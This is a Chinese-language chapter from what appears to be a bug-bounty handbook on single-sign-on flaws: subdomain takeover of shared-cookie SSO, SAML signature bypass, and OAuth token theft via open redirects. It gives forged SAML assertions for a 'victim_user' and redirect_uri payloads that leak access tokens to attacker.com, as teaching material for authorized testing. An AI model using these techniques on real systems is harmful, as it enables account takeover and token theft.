# 第20章：单点登录安全问题（Single-Sign-On Security Issues）

单点登录（SSO）是一种允许用户无需多次登录即可访问同一组织的多个服务的功能。一旦你登录了使用SSO的网站，在访问同一公司的另一项服务或资源时，就不必再次输入凭据。例如，如果你登录了 facebook.com，则无需重新输入凭据即可使用 messenger.com（Facebook的一项服务）。

这种做法对于拥有许多Web服务的公司来说很方便，因为他们可以集中管理用户凭据，而无需为每个站点维护不同的用户集。用户也可以节省时间，因为他们在使用同一公司提供的不同服务时无需多次登录。由于它为公司和用户都带来了极大的便利，SSO已成为互联网上的常见做法。

但威胁SSO系统的新漏洞也层出不穷。在本章中，我们将讨论开发人员用于实现SSO的三种方法，以及与每种方法相关的一些漏洞。

## 机制

Cookie共享、SAML和OAuth是实现SSO的三种最常见方式。每种机制都有独特的优势和劣势，开发人员根据需求选择不同的方法。

### Cookie共享

如果需要共享身份验证的服务位于同一父域下（如 www.facebook.com 和 m.facebook.com 的Web和移动版本），SSO的实现就相当容易。在这些情况下，应用程序可以跨子域共享Cookie。

#### Cookie共享的工作原理

现代浏览器允许站点在Cookie的`Domain`标志设置为共同的父域时跨子域共享Cookie。例如，如果服务器设置了如下Cookie，则该Cookie将被发送到 facebook.com 的所有子域：

```
Set-Cookie: cookie=abc123; Domain=facebook.com; Secure; HttpOnly
```

然而，并非所有应用程序都可以使用此方法，因为Cookie无法以这种方式跨不同域共享。例如，facebook.com 和 messenger.com 无法共享Cookie，因为它们没有共同的父域。

此外，这种简单的SSO设置也带来了独特的漏洞。首先，由于会话Cookie在所有子域之间共享，攻击者只需窃取用户的一个Cookie即可接管同一父域下所有网站的账户。通常，攻击者可以通过发现跨站脚本等漏洞来窃取会话Cookie。

另一种常见的危害共享会话SSO的方法是子域名接管漏洞。

#### 子域名接管

简而言之，当攻击者控制公司的未使用了域名时，就会发生子域名接管。

假设一家公司将其子域名托管在第三方服务上，如AWS或GitHub Pages。该公司可以使用DNS CNAME记录将子域名指向第三方站点上的另一个URL。这样，每当用户请求官方子域名时，他们就会被重定向到第三方网页。

例如，假设一个组织想要将其子域名 abc.example.com 托管在GitHub页面 abc_example.github.io 上。该组织可以使用DNS CNAME记录将 abc.example.com 指向 abc_example.github.io，以便尝试访问 abc.example.com 的用户将被重定向到GitHub托管的页面。

但如果此第三方站点被删除，指向该第三方站点的CNAME记录将保留，除非有人记得将其移除。我们称这些被遗弃的CNAME记录为**悬空CNAME**。由于第三方页面现在无人认领，任何在第三方服务上注册该站点的人都可以获得公司子域名的控制权。

假设我们示例中的公司后来决定删除GitHub页面，但忘记移除指向 abc_example.github.io 的CNAME记录。由于 abc_example.github.io 现在无人认领，任何人都可以注册GitHub账户并在 abc_example.github.io 创建GitHub页面。由于 abc.example.com 仍然指向 abc_example.github.io，abc_example.github.io 的所有者现在完全控制了 abc.example.com。

子域名接管使攻击者能够发起复杂的网络钓鱼活动。用户有时会检查他们正在访问的页面的域名是否合法，而子域名接管允许攻击者使用合法域名托管恶意页面。例如，接管 abc.example.com 的攻击者可以在GitHub页面上托管一个看起来像 example.com 的页面，以诱骗用户提供凭据。

但如果组织使用Cookie共享，子域名接管会变得更加危险。想象一下 example.com 实现了一个基于共享会话的SSO系统。其Cookie将被发送到 example.com 的任何子域，包括 abc.example.com。现在，接管 abc.example.com 的攻击者可以在那里托管恶意脚本来窃取会话Cookie。他们可以诱骗用户访问 abc.example.com，也许是通过将其作为虚假图片托管或将链接发送给用户。只要受害者已经登录过 example.com 的SSO系统一次，受害者的浏览器就会将其Cookie发送到攻击者的站点。攻击者可以窃取受害者的共享会话Cookie，并以受害者身份登录所有共享同一会话Cookie的服务。

如果攻击者通过控制单个子域名就能窃取共享会话Cookie，那么所有 example.com 站点都将面临风险。由于单个子域名的入侵可能意味着整个SSO系统的完全入侵，使用共享Cookie作为SSO机制大大扩大了每个服务的攻击面。

### 安全断言标记语言

安全断言标记语言（SAML）是一种基于XML的标记语言，用于在更大规模的应用程序中促进SSO。SAML通过促进三方（用户、身份提供者和服务提供者）之间的信息交换来实现SSO。

#### SAML的工作原理

在SAML系统中，用户从身份提供者获得身份断言，并使用它来向服务提供者进行身份验证。身份提供者是负责认证用户并将用户信息传递给服务提供者的服务器。服务提供者是用户实际想要访问的站点。

图20-1说明了该过程的工作原理。

*（图20-1：SAML身份验证过程的简化视图）*

首先，你尝试从服务提供者访问资源。由于你未登录，服务提供者让你向身份提供者发送SAML请求。一旦你提供了凭据，身份提供者将向你发送SAML响应，你可以使用它向服务提供者进行身份验证。SAML响应包含一个身份断言，向服务提供者传达你的身份。这些通常是唯一可识别的信息，如用户名、邮箱地址或用户ID。例如，查看以下SAML身份断言。它通过用户的用户名传达用户身份：

```xml
<saml:AttributeStatement>
  <saml:Attribute Name="username">
    <saml:AttributeValue>
      user1
    </saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>
```

**注意：** 本章中的所有SAML消息都为可读性而高度简化。真实的SAML消息会更长，包含更多信息。

#### SAML漏洞

如图20-1所示，访问服务提供者所持有资源的关键在于SAML响应。能够控制传递给服务提供者的SAML响应的攻击者可以以他人身份进行认证。因此，应用程序需要保护其SAML消息的完整性，通常通过使用签名对消息进行签名来实现。

如果SAML签名正确实施，SAML可以是安全的。但如果攻击者能够找到绕过签名验证并伪造身份断言以冒充他人身份的方法，其安全性就会被打破。例如，如果攻击者可以更改SAML断言中嵌入的用户名，他们就可以以其他用户身份登录。

大多数应用程序应用于SAML消息的数字签名确保没有人能够篡改它们。如果SAML消息的签名错误，它将不会被接受：

```xml
<saml:Signature>
  <saml:SignatureValue>
    dXNlcjE=
  </saml:SignatureValue>
</saml:Signature>
<saml:AttributeStatement>
  <saml:Attribute Name="username">
    <saml:AttributeValue>
      user1
    </saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>
```

不幸的是，SAML安全机制并不总是实现良好。有时SAML签名根本未被实现或验证！如果是这种情况，攻击者可以随意伪造SAML响应中的身份信息。其他时候，开发人员犯的错误是仅在签名存在时才验证签名。攻击者随后可以清空签名字段或完全移除该字段以绕过安全措施。

最后，如果用于生成签名的签名机制薄弱或可预测，攻击者可以伪造签名。如果你仔细查看之前的签名SAML消息，你会注意到签名`dXNlcjE=`只是`user1`的base64编码。我们可以推断使用的签名机制是`base64(username)`。要为`victim_user`伪造有效的身份断言，我们可以将签名字段改为`base64("victim_user")`，即`dmljdGltX3VzZXI=`，并获得作为`victim_user`的有效会话：

```xml
<saml:Signature>
  <saml:SignatureValue>
    dmljdGltX3VzZXI=
  </saml:SignatureValue>
</saml:Signature>
<saml:AttributeStatement>
  <saml:Attribute Name="username">
    <saml:AttributeValue>
      victim_user
    </saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>
```

开发人员常犯的另一个错误是相信仅凭加密就能为SAML消息提供足够的安全性。加密保护消息的机密性，而非完整性。如果SAML响应被加密但未签名，或使用弱签名签名，攻击者可以尝试篡改加密消息以干扰身份断言的结果。

有许多有趣的方法可以在不破解加密的情况下篡改加密消息。此类技术的细节超出了本书范围，但我鼓励你在互联网上查找它们。要了解更多关于加密攻击的信息，请访问维基百科：https://en.wikipedia.org/wiki/Encryption#Attacks_and_countermeasures。

SAML消息也是敏感数据泄露的常见来源。如果SAML消息包含敏感用户信息（如密码）且未加密，拦截受害者流量的攻击者可能能够窃取这些信息。

最后，攻击者可以使用SAML作为向量，将恶意输入走私到站点上。例如，如果SAML消息中的某个字段被传递到数据库中，攻击者可能能够污染该字段以实现SQL注入。根据SAML消息在服务器端的使用方式，攻击者也可能能够执行XSS、XXE和一系列其他恶意Web攻击。

这些SAML漏洞都源于未能通过签名和加密来保护SAML消息。应用程序应使用强加密和签名算法，并保护其密钥不被窃取。此外，密码等敏感用户信息不应在未加密的SAML消息中传输。最后，与所有用户输入一样，SAML消息在使用前应被清理并检查恶意用户输入。

### OAuth

我们将讨论的最后一种实现SSO的方式是OAuth。OAuth本质上是一种用户通过身份提供者向服务提供者授予范围特定访问令牌的方式。身份提供者在单一位置管理凭据和用户信息，并允许用户通过向服务提供者提供有关用户身份的信息来登录。

#### OAuth的工作原理

当你使用OAuth登录应用程序时，服务提供者向身份提供者请求访问你的信息。这些资源可能包括你的邮箱地址、联系人、出生日期以及确定你是谁所需的任何其他信息。这些权限和数据称为**范围**。然后身份提供者将创建一个唯一的`access_token`，服务提供者可以使用它来获取范围定义的资源。

让我们进一步分解。当你通过OAuth登录服务提供者时，服务提供者发送给身份提供者的第一个请求是授权请求。此请求将包括用于标识服务提供者的`client_id`、用于重定向身份验证流程的`redirect_uri`、列出请求权限的`scope`，以及一个本质上是CSRF令牌的`state`参数：

```
identity.com/oauth?
  client_id=CLIENT_ID
  &response_type=code
  &state=STATE
  &redirect_uri=https://example.com/callback
  &scope=email
```

然后，身份提供者将要求用户授予对服务提供者的访问权限，通常通过弹出窗口。图20-2显示了如果你选择通过Facebook登录Spotify，Facebook用于请求你同意向 spotify.com 发送信息的弹出窗口。

*（图20-2：典型OAuth流程中看到的同意弹出窗口）*

在用户同意服务提供者请求的权限后，身份提供者将向`redirect_uri`发送授权码：

```
https://example.com/callback?authorization_code=abc123&state=STATE
```

然后服务提供者可以使用授权码以及其客户端ID和密钥从身份提供者获取`access_token`。客户端ID和客户端密钥用于向身份提供者验证服务提供者：

```
identity.com/oauth/token?
  client_id=CLIENT_ID
  &client_secret=CLIENT_SECRET
  &redirect_uri=https://example.com/callback
  &code=abc123
```

身份提供者将返回`access_token`，可用于访问用户的信息：

```
https://example.com/callback?#access_token=xyz123
```

例如，服务提供者可能发起向身份提供者请求访问令牌以获取用户邮箱的请求。然后它可以使用从身份提供者检索到的邮箱作为用户身份的证明，以该邮箱注册的账户登录用户。

#### OAuth漏洞

有时攻击者可以通过开放重定向窃取关键的OAuth令牌来绕过OAuth身份验证。攻击者通过操纵`redirect_uri`参数来从受害者账户窃取`access_token`。

`redirect_uri`决定身份提供者将`access_token`等关键信息发送到哪里。因此，大多数主要身份提供者要求服务提供者指定允许用作`redirect_uri`的URL白名单。如果请求中提供的`redirect_uri`不在白名单中，身份提供者将拒绝该请求。例如，如果只允许 example.com 子域，以下请求将被拒绝：

```
client_id=CLIENT_ID
&response_type=code
&state=STATE
&redirect_uri=https://attacker.com
&scope=email
```

但如果白名单的`redirect_uri` URL之一中存在开放重定向漏洞呢？通常，`access_token`通过URL片段传递，该片段在所有跨域重定向中保持不变。如果攻击者最终能使OAuth流程重定向到攻击者的域，他们就可以从URL片段中窃取`access_token`并获得对用户账户的访问权限。

重定向OAuth流程的一种方法是通过基于URL参数的开放重定向。例如，使用以下URL作为`redirect_uri`：

```
redirect_uri=https://example.com/callback?next=attacker.com
```

将首先使流程重定向到回调URL：

```
https://example.com/callback?next=attacker.com#access_token=xyz123
```

然后重定向到攻击者的域：

```
https://attacker.com#access_token=xyz123
```

攻击者可以向受害者发送精心构造的URL，该URL将启动OAuth流程，然后在其服务器上运行监听器以收集泄露的令牌：

```
identity.com/oauth?
  client_id=CLIENT_ID
  &response_type=code
  &state=STATE
  &redirect_uri=https://example.com/callback?next=attacker.com
  &scope=email
```

重定向OAuth流程的另一种方法是通过基于Referer的开放重定向。在这种情况下，攻击者必须通过从其域启动OAuth流程来设置Referer头：

```html
<a href="https://example.com/login_via_facebook">Click here to log in to example.com</a>
```

这将首先使流程重定向到回调URL：

```
https://example.com/callback?#access_token=xyz123
```

然后通过Referer重定向到攻击者的域：

```
https://attacker.com#access_token=xyz123
```

即使攻击者无法在OAuth端点本身找到开放重定向，如果他们能找到开放重定向链，仍然可以将令牌带出站外。例如，假设`redirect_uri`参数只允许进一步重定向到 example.com 域下的URL。如果攻击者能在该域内找到开放重定向，他们仍然可以通过重定向窃取OAuth令牌。假设 example.com 的注销端点上存在一个未修复的开放重定向：

```
https://example.com/logout?next=attacker.com
```

通过利用此开放重定向，攻击者可以形成重定向链，最终将令牌带出站外，从以下开始：

```
redirect_uri=https://example.com/callback?next=example.com/logout?next=attacker.com
```

此`redirect_uri`将首先使流程重定向到回调URL：

```
https://example.com/callback?next=example.com/logout?next=attacker.com#access_token=xyz123
```

然后重定向到易受开放重定向攻击的注销URL：

```
https://example.com/logout?next=attacker.com#access_token=xyz123
```

然后它将重定向到攻击者的域。攻击者可以通过其服务器日志收集访问令牌，并通过窃取的令牌访问用户的资源：

```
https://attacker.com#access_token=xyz123
```

除了通过开放重定向窃取访问令牌外，不过期的长期令牌也是一个主要的OAuth漏洞。有时令牌不会定期失效，攻击者在窃取后很长时间仍可使用，甚至在密码重置后仍然有效。你可以通过在注销后和密码重置后使用相同的访问令牌来测试这些问题。

## 寻找子域名接管

让我们通过发现一些子域名接管来开始寻找SSO漏洞。可靠发现子域名接管的最佳方法是建立一个监控公司子域名的系统。但在那之前，让我们看看如何手动搜索子域名接管。

### 第1步：列出目标的子域名

首先，你需要建立目标所有已知子域名的列表。这可以使用第5章提到的工具完成。接下来，使用像EyeWitness或Snapper这样的截图应用程序来查看每个子域名上托管的内容。

### 第2步：查找未注册的页面

寻找指示页面未注册的第三方页面。例如，如果第三方页面托管在GitHub Pages上，你应该在子域名上看到类似图20-3的内容。

*（图20-3：此GitHub Pages页面未被认领的指示）*

即使你找到了悬空CNAME，也并非所有第三方托管服务提供商都容易受到接管的攻击。一些提供商采取措施验证用户身份，以防止人们注册与CNAME记录关联的页面。目前，托管在AWS、Bitbucket和GitHub上的页面容易受到攻击，而Squarespace和Google Cloud上的页面则不会。你可以在EdOverflow的相关页面（https://github.com/EdOverflow/can-i-take-over-xyz/）上找到哪些第三方站点易受攻击的完整列表。你也可以在那里找到指示未注册页面的页面特征列表。

### 第3步：注册页面

一旦确定该页面容易受到接管的攻击，你应该尝试在第三方站点上注册它以确认漏洞。要注册页面，请前往第三方站点并认领该页面；实际所需步骤因第三方提供商而异。在那里托管一个无害的概念验证页面以证明子域名接管，例如一个简单的HTML页面：

```html
<html>Subdomain Takeover by Vickie Li.</html>
```

确保保持该站点注册，直到公司通过移除悬空DNS CNAME或在第三方服务上重新认领页面来修复漏洞。如果你不这样做，恶意攻击者可能会在漏洞报告处理期间接管该子域名。

如果站点使用Cookie共享SSO，你可能能够通过子域名接管窃取Cookie。在服务器的响应中查找可以发送到多个子域名的Cookie。共享Cookie发送时带有`Domain`属性，指定可以访问Cookie的子域名的父域：

```
Set-Cookie: cookie=abc123; Domain=example.com; Secure; HttpOnly
```

然后，你可以登录合法站点，并在同一浏览器中访问你的站点。你可以监控新注册站点的日志，以确定你的Cookie是否被发送到它。如果你新注册站点的日志收到了你的Cookie，你就发现了一个可用于窃取Cookie的子域名接管！

即使你发现的子域名接管无法用于窃取共享会话Cookie，它仍然被视为一个漏洞。子域名接管可用于对站点用户发起网络钓鱼攻击，因此你仍然应该向组织报告它们！

### 监控子域名接管

许多黑客不是手动寻找子域名接管，而是建立一个监控系统来持续扫描它们。这很有用，因为站点随时都在更新其DNS条目并从第三方站点移除页面。你永远不知道站点何时会被关闭，也不知道新的悬空CNAME何时会出现在目标的资产中。如果这些变化导致子域名接管，你可以通过定期扫描接管来在其他人之前发现它。

要为子域名接管创建持续监控系统，你只需自动化我描述的手动寻找过程。在本节中，我将介绍一些自动化策略，实际实施留给读者：

1. **编制属于目标组织的子域名列表**
   - 定期扫描目标以发现新子域名。每当你发现新服务时，将其添加到监控子域名列表中。

2. **扫描列表中有CNAME记录指向托管在易受攻击第三方服务上的页面的子域名**
   - 为此，你需要解析子域名的基本DNS域，并根据URL中的关键字确定它是否托管在第三方提供商上。例如，指向包含`github.io`字符串的URL的子域名托管在GitHub Pages上。还要确定你发现的第三方服务是否容易受到接管的攻击。如果目标的站点专门托管在不易受子域名接管攻击的服务上，则无需扫描它们以寻找潜在的接管。

3. **确定每个外部服务的未注册页面特征**
   - 大多数服务都有自定义的404 Not Found页面，指示该页面未注册。你可以使用这些页面来检测潜在的接管。例如，托管在GitHub Pages上的页面如果在HTTP响应中返回字符串`There isn't a GitHub Pages site here`，则是易受攻击的。向第三方托管的子域名发出请求，并扫描响应中是否存在这些特征字符串。如果检测到其中一个特征，该页面可能容易受到接管的攻击。

使此寻找过程更高效的一种方法是让自动化解决方案在后台运行，仅在发现疑似接管时通知你。你可以设置一个cron job来定期运行你创建的脚本。只有当监控系统检测到可疑情况时，它才提醒你：

```
30 10 * * * cd /Users/vickie/scripts/security; ./subdomain_takeover.sh
```

脚本通知你潜在的子域名接管后，你可以通过在外部服务上注册页面来验证漏洞。

## 寻找SAML漏洞

现在让我们讨论如何发现有缺陷的SAML实现，并使用它们来绕过目标的SSO访问控制。在深入之前，请务必确认网站确实在使用SAML。你可以通过拦截用于站点认证的流量并查找类似XML的消息或关键字`saml`来确定。请注意，SAML消息并不总是以纯XML格式传递。它们可能以base64或其他编码方案编码。

### 第1步：定位SAML响应

首先也是最重要的，你需要定位SAML响应。通常可以通过使用代理拦截浏览器和服务提供者之间的请求来完成。SAML响应将在用户浏览器登录该特定服务提供者的新会话时发送。

### 第2步：分析响应字段

找到SAML响应后，你可以分析其内容以查看服务提供者使用哪些字段来确定用户身份。由于SAML响应用于将认证数据中继到服务提供者，它必须包含传达该信息的字段。例如，查找`username`、`email address`、`userID`等字段名。尝试在代理中篡改这些字段。如果SAML消息缺少签名，或者如果SAML响应的签名根本没有被验证，篡改消息就是你以他人身份进行认证所需的全部操作！

### 第3步：绕过签名

如果你正在篡改的SAML消息确实有签名，你可以尝试几种策略来绕过它。

如果仅在签名存在时才验证签名，你可以尝试从SAML响应中移除签名值。有时这是绕过安全检查所需的唯一操作。你可以通过两种方式做到这一点。首先，你可以清空签名字段：

```xml
<saml:Signature>
  <saml:SignatureValue>
  </saml:SignatureValue>
</saml:Signature>
<saml:AttributeStatement>
  <saml:Attribute Name="username">
    <saml:AttributeValue>
      victim_user
    </saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>
```

或者你可以尝试完全移除该字段：

```xml
<saml:AttributeStatement>
  <saml:Attribute Name="username">
    <saml:AttributeValue>
      victim_user
    </saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>
```

如果应用程序使用的SAML响应签名是可预测的，如我们之前讨论的base64示例，你可以简单地重新计算签名并伪造有效的SAML响应。

### 第4步：重新编码消息

篡改SAML响应后，将消息重新编码为其原始形式并发送回服务提供者。服务提供者将使用该信息向你认证服务。如果你成功，你可以获得属于受害者账户的有效会话。SAML Raider是一个Burp Suite扩展，可以帮助你编辑和重新编码SAML消息。

## 寻找OAuth令牌窃取

在深入研究寻找OAuth开放重定向问题之前，你应该首先确定网站是否使用OAuth。你可以通过拦截完成网站认证的请求并在HTTP消息中查找`oauth`关键字来确定。

然后开始寻找开放重定向漏洞。你可以在第7章找到如何发现开放重定向的详细信息。最后，查看你是否可以使用你找到的开放重定向之一将OAuth令牌带出站外。

## 提升攻击影响

SSO绕过通常意味着攻击者可以接管他人的账户。因此，这些漏洞在尝试提升之前已经具有高严重性。但你可以通过尝试接管高权限账户（如管理员账户）来提升SSO绕过漏洞。

此外，在你接管了一个站点上的用户账户后，你可以尝试使用相同的OAuth凭据访问其他站点上的受害者账户。例如，如果你可以通过子域名接管泄露员工的Cookie，查看你是否可以使用相同的凭据访问其公司的内部服务，如管理面板、商业智能系统和HR应用程序。

你还可以通过编写脚本来自动化大规模账户的接管来提升账户接管。最后，你可以尝试使用你已接管的账户泄露数据、执行敏感操作或接管应用程序。例如，如果你可以在银行站点上绕过SSO，你能读取私人信息或非法转账吗？如果你可以接管管理员账户，你能更改应用程序设置或以管理员身份执行脚本吗？再次强调，谨慎行事，未经许可切勿测试任何内容。

## 找到你的第一个SSO绕过！

现在你已经熟悉了几种SSO绕过技术，尝试找到你的第一个SSO绕过漏洞：

1. **如果目标应用程序使用单点登录**，确定正在使用的SSO机制。
2. **如果应用程序使用共享会话Cookie**，尝试通过子域名接管窃取会话Cookie。
3. **如果应用程序使用基于SAML的SSO方案**，测试服务器是否正确验证SAML签名。
4. **如果应用程序使用OAuth**，尝试通过开放重定向窃取OAuth令牌。
5. **向漏洞赏金计划提交关于SSO绕过的报告！**
